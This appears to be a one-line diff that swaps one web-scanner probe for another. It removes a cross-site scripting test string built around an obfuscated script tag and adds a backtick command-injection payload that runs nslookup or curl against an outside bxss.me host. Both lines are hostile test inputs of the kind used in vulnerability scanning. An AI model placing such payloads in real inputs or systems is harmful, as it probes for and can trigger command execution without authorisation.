@@ -1,1 +1,1 @@
-'"()&%<zzz><ScRiPt >nsT6(9207)</ScRiPt>
+`(nslookup -q=cname hitbbargiejho096bb.bxss.me||curl hitbbargiejho096bb.bxss.me)`
